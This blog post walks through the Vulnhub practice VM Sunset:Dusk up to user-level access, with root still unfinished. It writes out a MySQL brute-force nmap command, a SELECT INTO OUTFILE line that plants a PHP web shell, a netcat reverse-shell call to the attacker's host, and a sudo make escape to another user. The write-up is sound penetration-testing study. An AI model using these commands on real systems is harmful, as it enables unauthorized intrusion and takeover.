---
layout: post
title: Sunset Dusk Vulnhub VM walkthrough
tags: vulnhub

---

## A review of the [Sunset:Dusk](https://www.vulnhub.com/entry/sunset-dusk,404/) VM from Vulnhub

### Note: This walkthrough gets user-level, then a privilege escalation, root still in progress

This machine is full of rabbit holes if you spend to much time in one area, so for that reason alone it's a great exercise in re-evaluating your progress occasionally. As always, we begin with our nmap scan to view available ports:


[<img src="{{ site.baseurl }}/images/dusk/1.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/1.png)

There are quite a few possibilities open here and some do leak information, but nothing we don't find out later (For example, the SMTP port can be used to verify users present on the system)

[<img src="{{ site.baseurl }}/images/dusk/3.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/3.png)

Port 8 is a default apache install, so we move next to port 8080 which promises so much command injection of path traversal, but is really a simple php script given the contents of its home directory, but we'll still use it later:

[<img src="{{ site.baseurl }}/images/dusk/2.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/2.png)

## Getting our first shell

So our first major breakthrough comes when we enumerate the open Mysql port and see that it allows remote connections (In that it at least checks our passwords rather than kicking us out right away)

using this nmap script:

    nmap --script=mysql-brute 10.0.2.13

we can brute force some simple mysql logins and come up with a valid username and password combination which we can use to login to myself with (Click the below screenshot to enlarge if you need to)

[<img src="{{ site.baseurl }}/images/dusk/4.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/4.png)

So we're in the database, let's see what's in there; if there are other users in there we'll be able to find their passwords too:

[<img src="{{ site.baseurl }}/images/dusk/5.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/5.png)

Nothing! the database is just empty except for the mysql root user, which isn't too helpful. But thanks to some atrocities such as *OUTFILE* we can write dodgy code to the local filesystem, such as this simple shell. Remembering back to the directory listing on port 8080, we have a location where php files are executed (/var/tmp)

[<img src="{{ site.baseurl }}/images/dusk/6.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/6.png)

 the command for this in copyable format:

    select "<? php system($\_GET['cmd']); ?>" into outfile "/var/tmp/alickshell.php"

and we can now revisit the listing on port 8080 to see if it has saved:

[<img src="{{ site.baseurl }}/images/dusk/8.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/8.png)     

give it a quick check:

[<img src="{{ site.baseurl }}/images/dusk/7.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/7.png)

and then we can try and execute something intrusive. launch a netcat listener with

    nc -lvp 4444

and then call the script from the server and tell it to connect to our listener:

    index.php?cmd=nc -e /bin/bash 10.0.2.5 4444

[<img src="{{ site.baseurl }}/images/dusk/7_b.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/7_b.png)    


and watch our listener connect:

[<img src="{{ site.baseurl }}/images/dusk/9.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/9.png)

and we can navigate to our first user flag:

[<img src="{{ site.baseurl }}/images/dusk/10.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/10.png)

 ## Our first user pivot

When we run:

    sudo -l

We can see what our user can do to escape into another user:

[<img src="{{ site.baseurl }}/images/dusk/11.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/11.png)     

What this means is that without using a password for our sudo (since we don't have one), we can execute the three binaries listed as if we were the local user *dusk*

I found [THIS](https://gtfobins.github.io/gtfobins/make/) article which tells us that we can use make to invoke a shell, which in this case will be as the dusk user:

[<img src="{{ site.baseurl }}/images/dusk/11_a.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/11_a.png)

And now we have our dusk user environment:

[<img src="{{ site.baseurl }}/images/dusk/12.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/12.png)

 ## Root privilege escalation

 In progress!
